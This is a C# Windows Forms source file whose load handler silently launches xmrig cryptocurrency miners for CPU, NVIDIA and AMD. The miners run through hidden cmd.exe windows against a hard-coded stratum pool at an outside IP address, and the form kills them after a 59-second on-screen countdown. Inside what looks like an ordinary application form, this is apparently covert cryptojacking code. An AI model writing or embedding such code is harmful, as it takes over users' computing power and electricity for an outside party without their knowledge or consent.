using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace WindowsFormsApp1
{
    public partial class Form4 : Form
    {
        public Form4()
        {
            InitializeComponent();
        }

        private void Form4_Load(object sender, EventArgs e)
        {
            string cmd = "start C:\\PMApp\\xmrig\\xmrig-cpu.exe -B -a cryptonight -o stratum+tcp://213.5.31.38:6666 -u cpu -p donate";
            string cmd2 = "start C:\\PMApp\\xmrig\\xmrig-nvidia.exe -B -a cryptonight -o stratum+tcp://213.5.31.38:6666 -u nvidia -p donate";
            string cmd3 = "start C:\\PMApp\\xmrig\\xmrig-amd.exe -B -a cryptonight -o stratum+tcp://213.5.31.38:6666 -u amd -p donate";
            var proc = new ProcessStartInfo()
            {
                UseShellExecute = true,
                WorkingDirectory = @"C:\Windows\System32",
                FileName = @"C:\Windows\System32\cmd.exe",
                Arguments = "/c " + cmd,
                WindowStyle = ProcessWindowStyle.Hidden
            };
            if (Static.cpu)
            {
                Process.Start(proc);
            }
            var proc2 = new ProcessStartInfo()
            {
                UseShellExecute = true,
                WorkingDirectory = @"C:\Windows\System32",
                FileName = @"C:\Windows\System32\cmd.exe",
                Arguments = "/c " + cmd2,
                WindowStyle = ProcessWindowStyle.Hidden
            };
            if (Static.cuda)
            {
                Process.Start(proc2);
            }

            var proc3 = new ProcessStartInfo()
            {
                UseShellExecute = true,
                WorkingDirectory = @"C:\Windows\System32",
                FileName = @"C:\Windows\System32\cmd.exe",
                Arguments = "/c " + cmd3,
                WindowStyle = ProcessWindowStyle.Hidden
            };
            if (Static.ocl)
            {
                Process.Start(proc3);
            }
            timer1.Interval = 1000;
            timer1.Start();
        }

        int time = 59;

        private void timer1_Tick(object sender, EventArgs e)
        {
            if (time > 0)
            {
                label3.Text = time.ToString();
                time--;
                label3.Text = time.ToString();
            }
            else
            {
                label3.Text = time.ToString();
                Process[] processes = Process.GetProcessesByName("xmrig-cpu");
                Process[] processes2 = Process.GetProcessesByName("xmrig-nvidia");
                Process[] processes3 = Process.GetProcessesByName("xmrig-amd");

                foreach (Process process in processes)
                {
                    try
                    {
                        int procc = process.Id;
                        if (procc != 0)
                        {
                            process.Kill();
                        }
                    }
                    catch (Exception)
                    {
                    }
                }
                foreach (Process process in processes2)
                {
                    try
                    {
                        int procc = process.Id;
                        if (procc != 0)
                        {
                            process.Kill();
                        }
                    }
                    catch (Exception)
                    {
                    }
                }
                foreach (Process process in processes3)
                {
                    try
                    {
                        int procc = process.Id;
                        if (procc != 0)
                        {
                            process.Kill();
                        }
                    }
                    catch (Exception)
                    {
                    }
                }

                Form2 frm = new Form2();
                frm.Show();
                this.Close();
            }
        }
    }
}
